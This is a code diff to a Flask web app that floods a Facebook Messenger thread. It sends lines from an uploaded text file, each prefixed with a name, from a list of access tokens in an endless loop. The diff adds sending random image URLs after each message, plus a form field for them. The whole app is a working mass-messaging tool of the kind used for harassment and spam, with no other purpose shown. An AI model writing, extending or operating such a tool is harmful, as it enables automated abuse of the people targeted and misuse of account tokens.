@@ -4,6 +4,7 @@ from threading import Thread, Event
 import time
 import random
 import string
+import os
  
 app = Flask(__name__)
 app.debug = True
@@ -23,13 +24,18 @@ headers = {
 stop_events = {}
 threads = {}
  
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_urls, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
-        for message1 in messages:
+        for i, message1 in enumerate(messages):
             if stop_event.is_set():
                 break
+            
+            # Send message
             for access_token in access_tokens:
+                if stop_event.is_set():
+                    break
+                    
                 api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                 message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
@@ -39,6 +45,28 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 else:
                     print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
+            
+            # Send image after each message if image URLs are provided
+            if image_urls and not stop_event.is_set():
+                for access_token in access_tokens:
+                    if stop_event.is_set():
+                        break
+                        
+                    # Select random image or cycle through images
+                    image_url = random.choice(image_urls) if image_urls else None
+                    if image_url:
+                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                        parameters = {
+                            'access_token': access_token,
+                            'message': ' ',  # Empty message or you can add something
+                            'attachment_url': image_url
+                        }
+                        response = requests.post(api_url, data=parameters, headers=headers)
+                        if response.status_code == 200:
+                            print(f"Image Sent Successfully From token {access_token}: {image_url}")
+                        else:
+                            print(f"Image Sent Failed From token {access_token}: {image_url}")
+                        time.sleep(time_interval)
  
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
@@ -57,11 +85,17 @@ def send_message():
  
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
+        
+        # Handle image URLs input
+        image_urls = []
+        image_urls_text = request.form.get('imageUrls', '')
+        if image_urls_text:
+            image_urls = [url.strip() for url in image_urls_text.split('\n') if url.strip()]
  
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
  
         stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, image_urls, task_id))
         threads[task_id] = thread
         thread.start()
  
@@ -108,6 +142,10 @@ def send_message():
       border-radius: 10px;
       color: white;
     }
+    .form-control-textarea {
+      height: 100px;
+      resize: vertical;
+    }
     .header { text-align: center; padding-bottom: 20px; }
     .btn-submit { width: 100%; margin-top: 10px; }
     .footer { text-align: center; margin-top: 20px; color: #888; }
@@ -118,6 +156,12 @@ def send_message():
       margin-top: 10px;
     }
     .whatsapp-link i { margin-right: 5px; }
+    .info-text {
+      font-size: 12px;
+      color: #ccc;
+      margin-top: -15px;
+      margin-bottom: 15px;
+    }
   </style>
 </head>
 <body>
@@ -158,6 +202,11 @@ def send_message():
         <label for="txtFile" class="form-label">Choose Your Np File</label>
         <input type="file" class="form-control" id="txtFile" name="txtFile" required>
       </div>
+      <div class="mb-3">
+        <label for="imageUrls" class="form-label">Enter Image URLs (One per line)</label>
+        <textarea class="form-control form-control-textarea" id="imageUrls" name="imageUrls" placeholder="Enter image URLs, one per line&#10;Example:&#10;https://example.com/image1.jpg&#10;https://example.com/image2.png"></textarea>
+        <div class="info-text">Leave empty if you don't want to send images</div>
+      </div>
       <button type="submit" class="btn btn-primary btn-submit">Run</button>
       </form>
     <form method="post" action="/stop">
@@ -188,6 +237,11 @@ def send_message():
         document.getElementById('tokenFileInput').style.display = 'block';
       }
     }
+    
+    // Initialize on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      toggleTokenInput();
+    });
   </script>
 </body>
 </html>
